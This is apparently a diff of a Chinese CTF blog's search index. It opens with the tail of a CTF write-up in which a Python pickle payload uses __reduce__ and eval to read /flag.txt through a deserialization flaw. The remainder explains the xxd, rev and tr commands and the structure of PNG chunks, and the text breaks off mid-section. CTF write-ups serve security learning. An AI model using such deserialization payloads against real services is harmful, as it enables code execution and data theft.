-<p>​        到这里我不会了，打开admin.py，把里面不认识的函数+漏洞作为关键词挨个搜索了之后，urllib.load()这个函数存在一个反序列化漏洞。按照blog里的仿写一个payload。<a href=https://www.cnblogs.com/cimuhuashuimu/p/11544463.html>反序列化漏洞</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只能使用python2，python3因为不明原因无法正常生成payload</span></span><br><span class="line"><span class="keyword">import</span> pickle <span class="keyword">as</span> p</span><br><span class="line"><span class="keyword">import</span> urllib <span class="keyword">as</span> u</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&#x27;open(&quot;/flag.txt&quot;,&quot;r&quot;).read()&#x27;</span>,))</span><br><span class="line">a = p.dumps(payload())</span><br><span class="line">a = u.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
-
-<p>​        将输出的payload填进输入栏后即得到flag</p>
-<p><img src="https://i.loli.net/2020/09/29/d14Rh3wYqOgWezu.png" alt="image-20200807193720295.png"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 隐写 </tag>
+            
+            <tag> 图片 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xxd - make a hex dump or do the  reverse</title>
+      <link href="2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/"/>
+      <url>2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxd -h</span><br><span class="line">xxd [options][infile[outfile]]</span><br><span class="line">xxd -r [options][infile[outfile]]</span><br></pre></td></tr></table></figure><ol><li><p><code>-b</code>:以2进制格式输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -b train.ini</span></span><br><span class="line">0000000: 01011011 01110100 01110010 01100001 01101001 01101110  [train</span><br><span class="line">0000006: 01011101 00001101 00001010 01101110 01100111 01110010  ]..ngr</span><br><span class="line">000000c: 01100001 01101101 01100110 01101001 01101100 01100101  amfile</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><ol start="2"><li><p><code>-c</code>:每行输出多少个字节</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -c4 train.ini</span></span><br><span class="line">0000000: 5b74 7261  [tra</span><br><span class="line">0000004: 696e 5d0d  in].</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>-g</code>:几个字节组成一组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -g4 train.ini</span></span><br><span class="line">0000000: 5b747261 696e5d0d 0a6e6772 616d6669  [train]..ngramfi</span><br><span class="line">0000010: 6c653d22 6e675f32 772e7478 74220d0a  le=&quot;ng_2w.txt&quot;..</span><br><span class="line">0000020: 69746572 636f756e 743d3430 30300d0a  itercount=4000..</span><br></pre></td></tr></table></figure></li><li><p><code>-i</code>:将文件内容输出成 c的一个数组格式</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -i train.ini</span></span><br><span class="line">unsigned char train_ini[] = &#123;</span><br><span class="line">0x5b, 0x74, 0x72, 0x61, 0x69, 0x6e, 0x5d, 0x0d, 0x0a, 0x6e, 0x67, 0x72,</span><br><span class="line">0x61, 0x6d, 0x66, 0x69, 0x6c, 0x65, 0x3d, 0x22, 0x6e, 0x67, 0x5f, 0x32,</span><br><span class="line"> &#125;;</span><br><span class="line"> unsigned int train_ini_len = 148;</span><br></pre></td></tr></table></figure></li><li><p><code>-l</code>:输出几个字节后结束</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -l12 train.ini</span></span><br><span class="line">0000000: 5b74 7261 696e 5d0d 0a6e 6772            [train]..ngr</span><br></pre></td></tr></table></figure></li><li><p><code>-p</code>：以一个整块输出所有的hex， 不使用空格进行分割</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -p train.ini</span></span><br><span class="line">5b747261696e5d0d0a6e6772616d66696c653d226e675f32772e74787422</span><br><span class="line">0d0a69746572636f756e743d343030300d0a73766d6761703d302e303030</span><br><span class="line">310d0a74656d706469723d2274656d70220d0a7664636c6973743d227664</span><br><span class="line">632e7478742220204f520d0a77686974656c6973743d2277686974652e6c</span><br><span class="line">697374220d0a626c61636b6c6973743d22626c61636b2e6c69737422</span><br></pre></td></tr></table></figure></li><li><p><code>-r</code>:反转操作，将16进制转为2进制</p></li><li><p><code>-s [+][-]seek</code>:从第几个字符开始</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -s5 train.ini</span></span><br><span class="line">0000005: 6e5d 0d0a 6e67 7261 6d66 696c 653d 226e  n]..ngramfile=&quot;n</span><br><span class="line">0000015: 675f 3277 2e74 7874 220d 0a69 7465 7263  g_2w.txt&quot;..iterc</span><br><span class="line">0000025: 6f75 6e74 3d34 3030 300d 0a73 766d 6761  ount=4000..svmga</span><br></pre></td></tr></table></figure></li><li><p><code>-u</code>:输出采用大写</p></li></ol><h1 id="rev"><a href="#rev" class="headerlink" title="rev"></a><strong>rev</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat iptables.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013</span></span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [48113:2690676]</span><br><span class="line">:FORWARD accept [0:0]</span><br><span class="line">:OUTPUT ACCEPT [3381959:1818595115]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line">-A OUTPUT -o lo -j ACCEPT</span><br><span class="line">COMMIT</span><br><span class="line"><span class="meta">#</span><span class="bash"> Completed on Thu Dec 26 21:25:15 2013</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# rev iptables.bak    </span><br><span class="line">3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #</span><br><span class="line">retlif*</span><br><span class="line">]6760962:31184[ PORD TUPNI:</span><br><span class="line">]0:0[ TPECCA DRAWROF:</span><br><span class="line">]5115958181:9591833[ TPECCA TUPTUO:</span><br><span class="line"> TPECCA j- ol i- TUPNI A-</span><br><span class="line"> TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-</span><br><span class="line"> TPECCA j- pmci p- TUPNI A-</span><br><span class="line"> TPECCA j- ol o- TUPTUO A-</span><br><span class="line">TIMMOC</span><br><span class="line">3102 51:52:12 62 ceD uhT no detelpmoC #</span><br></pre></td></tr></table></figure><h1 id="tr"><a href="#tr" class="headerlink" title="tr"></a><strong>tr</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -c -d -s [&quot;string1_to_translate_from&quot;] [&quot;string2_to_translate_to&quot;] &lt; input-file</span><br></pre></td></tr></table></figure><p><code>-c</code> 用字符串1中字符集的补集替换此字符集，要求字符集为ASCII。<br><code>-d</code> 删除字符串1中所有输入字符。<br><code>-s</code> 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。<br><code>input-file</code>是转换文件名。虽然可以使用其他格式输入，但这种格式最常用。</p><p><strong>字符范围</strong><br>    指定字符串1或字符串2的内容时，只能使用单字符或字符串范围或列表。<br>    <code>[a-z]</code> a-z内的字符组成的字符串。<br>    <code>[A-Z]</code> A-Z内的字符组成的字符串。<br>    <code>[0-9]</code> 数字串。<br>    <code>\octal</code> 一个三位的八进制数，对应有效的ASCII字符。<br>    <code>[O*n] </code>表示字符O重复出现指定次数n。因此<code>[O*2]</code>匹配<code>OO</code>的字符串。</p><p><strong>tr中特定控制字符的不同表达方式</strong><br>    速记符含义八进制方式<br>    <code>\a</code> Ctrl-G 铃声\007<br>    <code>\b</code> Ctrl-H 退格符\010<br>    <code>\f</code> Ctrl-L 走行换页\014<br>    <code>\n</code> Ctrl-J 新行\012<br>    <code>\r</code> Ctrl-M 回车\015<br>    <code>\t </code> Ctrl-I tab键\011<br>    <code>\v  </code> Ctrl-X \030</p>]]></content>
+      
+      
       <categories>
-        <category>CTF</category>
-        <category>WriteUp</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xxd - make a hex dump or do the  reverse</title>
-    <url>/2020/09/28/%E6%96%87%E4%BB%B6%E5%8F%8D%E8%BD%AC/</url>
-    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -h</span><br><span class="line">xxd [options][infile[outfile]]</span><br><span class="line">xxd -r [options][infile[outfile]]</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p><code>-b</code>:以2进制格式输出</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -b train.ini</span></span><br><span class="line">0000000: 01011011 01110100 01110010 01100001 01101001 01101110  [train</span><br><span class="line">0000006: 01011101 00001101 00001010 01101110 01100111 01110010  ]..ngr</span><br><span class="line">000000c: 01100001 01101101 01100110 01101001 01101100 01100101  amfile</span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<a id="more"></a>
-
-<ol start="2">
-<li><p><code>-c</code>:每行输出多少个字节</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -c4 train.ini</span></span><br><span class="line">0000000: 5b74 7261  [tra</span><br><span class="line">0000004: 696e 5d0d  in].</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>-g</code>:几个字节组成一组</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -g4 train.ini</span></span><br><span class="line">0000000: 5b747261 696e5d0d 0a6e6772 616d6669  [train]..ngramfi</span><br><span class="line">0000010: 6c653d22 6e675f32 772e7478 74220d0a  le=&quot;ng_2w.txt&quot;..</span><br><span class="line">0000020: 69746572 636f756e 743d3430 30300d0a  itercount=4000..</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>-i</code>:将文件内容输出成 c的一个数组格式</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -i train.ini</span></span><br><span class="line">unsigned char train_ini[] = &#123;</span><br><span class="line">0x5b, 0x74, 0x72, 0x61, 0x69, 0x6e, 0x5d, 0x0d, 0x0a, 0x6e, 0x67, 0x72,</span><br><span class="line">0x61, 0x6d, 0x66, 0x69, 0x6c, 0x65, 0x3d, 0x22, 0x6e, 0x67, 0x5f, 0x32,</span><br><span class="line"> &#125;;</span><br><span class="line"> unsigned int train_ini_len = 148;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>-l</code>:输出几个字节后结束</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -l12 train.ini</span></span><br><span class="line">0000000: 5b74 7261 696e 5d0d 0a6e 6772            [train]..ngr</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>-p</code>：以一个整块输出所有的hex， 不使用空格进行分割</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -p train.ini</span></span><br><span class="line">5b747261696e5d0d0a6e6772616d66696c653d226e675f32772e74787422</span><br><span class="line">0d0a69746572636f756e743d343030300d0a73766d6761703d302e303030</span><br><span class="line">310d0a74656d706469723d2274656d70220d0a7664636c6973743d227664</span><br><span class="line">632e7478742220204f520d0a77686974656c6973743d2277686974652e6c</span><br><span class="line">697374220d0a626c61636b6c6973743d22626c61636b2e6c69737422</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>-r</code>:反转操作，将16进制转为2进制</p>
-</li>
-<li><p><code>-s [+][-]seek</code>:从第几个字符开始</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> xxd -s5 train.ini</span></span><br><span class="line">0000005: 6e5d 0d0a 6e67 7261 6d66 696c 653d 226e  n]..ngramfile=&quot;n</span><br><span class="line">0000015: 675f 3277 2e74 7874 220d 0a69 7465 7263  g_2w.txt&quot;..iterc</span><br><span class="line">0000025: 6f75 6e74 3d34 3030 300d 0a73 766d 6761  ount=4000..svmga</span><br></pre></td></tr></table></figure></li>
-<li><p><code>-u</code>:输出采用大写</p>
-</li>
-</ol>
-<h1 id="rev"><a href="#rev" class="headerlink" title="rev"></a><strong>rev</strong></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat iptables.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013</span></span><br><span class="line">*filter</span><br><span class="line">:INPUT DROP [48113:2690676]</span><br><span class="line">:FORWARD accept [0:0]</span><br><span class="line">:OUTPUT ACCEPT [3381959:1818595115]</span><br><span class="line">-A INPUT -i lo -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line">-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -j ACCEPT</span><br><span class="line">-A OUTPUT -o lo -j ACCEPT</span><br><span class="line">COMMIT</span><br><span class="line"><span class="meta">#</span><span class="bash"> Completed on Thu Dec 26 21:25:15 2013</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# rev iptables.bak    </span><br><span class="line">3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #</span><br><span class="line">retlif*</span><br><span class="line">]6760962:31184[ PORD TUPNI:</span><br><span class="line">]0:0[ TPECCA DRAWROF:</span><br><span class="line">]5115958181:9591833[ TPECCA TUPTUO:</span><br><span class="line"> TPECCA j- ol i- TUPNI A-</span><br><span class="line"> TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-</span><br><span class="line"> TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-</span><br><span class="line"> TPECCA j- pmci p- TUPNI A-</span><br><span class="line"> TPECCA j- ol o- TUPTUO A-</span><br><span class="line">TIMMOC</span><br><span class="line">3102 51:52:12 62 ceD uhT no detelpmoC #</span><br></pre></td></tr></table></figure>
-
-<h1 id="tr"><a href="#tr" class="headerlink" title="tr"></a><strong>tr</strong></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tr -c -d -s [&quot;string1_to_translate_from&quot;] [&quot;string2_to_translate_to&quot;] &lt; input-file</span><br></pre></td></tr></table></figure>
-
-<p><code>-c</code> 用字符串1中字符集的补集替换此字符集，要求字符集为ASCII。<br><code>-d</code> 删除字符串1中所有输入字符。<br><code>-s</code> 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。<br><code>input-file</code>是转换文件名。虽然可以使用其他格式输入，但这种格式最常用。</p>
-<p><strong>字符范围</strong><br>    指定字符串1或字符串2的内容时，只能使用单字符或字符串范围或列表。<br>    <code>[a-z]</code> a-z内的字符组成的字符串。<br>    <code>[A-Z]</code> A-Z内的字符组成的字符串。<br>    <code>[0-9]</code> 数字串。<br>    <code>\octal</code> 一个三位的八进制数，对应有效的ASCII字符。<br>    <code>[O*n] </code>表示字符O重复出现指定次数n。因此<code>[O*2]</code>匹配<code>OO</code>的字符串。</p>
-<p><strong>tr中特定控制字符的不同表达方式</strong><br>    速记符含义八进制方式<br>    <code>\a</code> Ctrl-G 铃声\007<br>    <code>\b</code> Ctrl-H 退格符\010<br>    <code>\f</code> Ctrl-L 走行换页\014<br>    <code>\n</code> Ctrl-J 新行\012<br>    <code>\r</code> Ctrl-M 回车\015<br>    <code>\t </code> Ctrl-I tab键\011<br>    <code>\v  </code> Ctrl-X \030</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 隐写 </tag>
+            
+            <tag> 工具使用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PNG文件结构</title>
+      <link href="2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
+      <url>2020/09/28/png%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
+      
+        <content type="html"><![CDATA[<p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p><table><thead><tr><th align="center">十进制数</th><th align="center">137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td align="center">十六进制数</td><td align="center">89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>其中第一个字节0x89超出了ASCII字符的范围，这是为了避免某些软件将PNG文件当做文本文件来处理。文件中剩余的部分由3个以上的PNG的数据块（Chunk）按照特定的顺序组成，因此，一个标准的PNG文件结构应该如下：</p><ul><li><p>PNG文件标志</p></li><li><p>PNG数据块 </p></li><li><p>……  </p></li><li><p>PNG数据块 </p></li></ul><a id="more"></a><hr><p><strong>PNG数据块（Chunk）</strong></p><p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。虽然PNG文件规范没有要求PNG编译码器对可选数据块进行编码和译码，但规范提倡支持可选数据块。</p><p>下表就是PNG中数据块的类别，其中，关键数据块部分我们使用深色背景加以区分。</p><table><thead><tr><th><strong>PNG文件格式中的数据块</strong></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td><strong>数据块符号</strong></td><td><strong>数据块名称</strong></td><td><strong>多数据块</strong></td><td><strong>可选否</strong></td><td><strong>位置限制</strong></td></tr><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>(专用公共数据块)</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>(专用公共数据块)</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><p>为了简单起见，我们假设在我们使用的PNG文件中，这4个数据块按以上先后顺序进行存储，并且都只出现一次。</p><p><strong>数据块结构</strong></p><p>PNG文件中，每个数据块由4个部分组成，如下：</p><table><thead><tr><th><strong>名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Length (长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td></tr><tr><td>Chunk Type Code (数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成</td></tr><tr><td>Chunk Data (数据块数据)</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC (循环冗余检测)</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p><p>x^32^+x^26^+x^23^+x^22^+x^16^+x^12^+x^11^+x^10^+x^8^+x^7^+x^5^+x^4^+x^2^+x+1</p><p>CRC: 一种校验算法。仅仅用来校验数据的正确性的</p><p>下面，我们依次来了解一下各个关键数据块的结构吧。</p><p><strong>IHDR</strong></p><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下表所示。</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：   索引彩色图像：1，2，4或8   灰度图像：1，2，4，8或16   真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型：  0：灰度图像, 1，2，4，8或16   2：真彩色图像，8或16   3：索引彩色图像，1，2，4或8   4：带α通道数据的灰度图像，8或16   6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法：  0：非隔行扫描   1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>由于本文很多设计到了PNG在手机方面的应用，因此在此提出MIDP1.0对所使用PNG图片的要求：</p><ul><li>在MIDP1.0中，只可以使用1.0版本的PNG图片。</li><li>文件大小：MIDP支持任意大小的PNG图片，然而实际上，如果一个图片过大，会由于内存耗尽而无法读取。</li><li>颜色类型：所有颜色类型都有被支持，虽然这些颜色的显示依赖于实际设备的显示能力。同时，MIDP也能支持alpha通道，但是，所有的alpha通道信息都会被忽略并且当作不透明的颜色对待。</li><li>色深：所有的色深都能被支持。</li><li>压缩方法：仅支持deflate压缩方式，这和jar文件的压缩方式完全相同，所以，PNG图片数据的解压和jar文件的解压可以使用相同的代码。</li><li>滤波器方法：在PNG中所有的5种方法都被支持。</li><li>隔行扫描：虽然MIDP支持0、1两种方式，然而，当使用隔行扫描时，MIDP却不会真正的使用隔行扫描方式来显示。</li><li>PLTE chunk：支持</li><li>IDAT chunk：图像信息必须使用5种过滤方式中的方式之一 (None, Sub, Up, Average, Paeth)</li><li>IEND chunk：当IEND数据块被找到时，这个PNG图像才认为是合法的PNG图像。</li><li>可选数据块：MIDP可以支持下列辅助数据块，然而，这却不是必须的。</li></ul><p>bKGD cHRM gAMA hIST iCCP iTXt pHYs<br> sBIT sPLT sRGB tEXt tIME tRNS zTXt</p><p><strong>PLTE</strong></p><p>调色板数据块PLTE(palette chunk)包含有与索引彩色图像(indexed-color image)相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。</p><p>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成：</p><table><thead><tr><th><strong>颜色</strong></th><th><strong>字节</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td>Red</td><td>1 byte</td><td>0 = 黑色, 255 = 红</td></tr><tr><td>Green</td><td>1 byte</td><td>0 = 黑色, 255 = 绿色</td></tr><tr><td>Blue</td><td>1 byte</td><td>0 = 黑色, 255 = 蓝色</td></tr></tbody></table><p>因此，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</p><p>对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p><p>真彩色图像和带alpha通道数据的真彩色图像也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。</p><p><strong>IDAT</strong></p><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p><p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</p><p><strong>IEND</strong></p><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p>00 00 00 00 49 45 4E 44 AE 42 60 82</p><p>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><hr><p><strong>实例研究PNG</strong></p><p>以下是由Fireworks生成的一幅图像，图像大小为8*8，</p><p>为了方便观看，将图像放大：</p><p> 使用UltraEdit32打开该文件，如下：<br><strong>00000000~00000007：</strong></p><p>可以看到，选中的头8个字节即为PNG文件的标识。</p><p>接下来的地方就是IHDR数据块了：</p><p><strong>00000008~00000020：</strong></p><ul><li>00 00 00 0D 说明IHDR头块长为13</li><li>49 48 44 52 IHDR标识</li><li>00 00 00 08 图像的宽，8像素</li><li>00 00 00 08 图像的高，8像素</li><li>04 色深，2^4=16，即这是一个16色的图像（也有可能颜色数不超过16，当然，如果颜色数不超过8，用03表示更合适）</li><li>03 颜色类型，索引图像</li><li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li><li>00 同上</li><li>00 非隔行扫描</li><li>36 21 A3 B8 CRC校验</li></ul><p><strong>00000021~0000002F：</strong></p><p>可选数据块sBIT，颜色采样率，RGB都是256（2^8=256）</p><p><strong>00000030~00000062：</strong></p><p>这里是调色板信息</p><ul><li>00 00 00 27 说明调色板数据长为39字节，既13个颜色数</li><li>50 4C 54 45 PLTE标识</li><li>FF FF 00 颜色0</li><li>FF ED 00 颜色1</li><li>…… ……</li><li>09 00 B2 最后一个颜色，12</li><li>5F F5 BB DD CRC校验</li></ul><p><strong>00000063~000000C5：</strong></p><p>这部分包含了pHYs、tExt两种类型的数据块共3块，由于并不太重要，因此也不再详细描述了。</p><p><strong>000000C0~000000F8：</strong></p><p>以上选中部分是IDAT数据块</p><ul><li>00 00 00 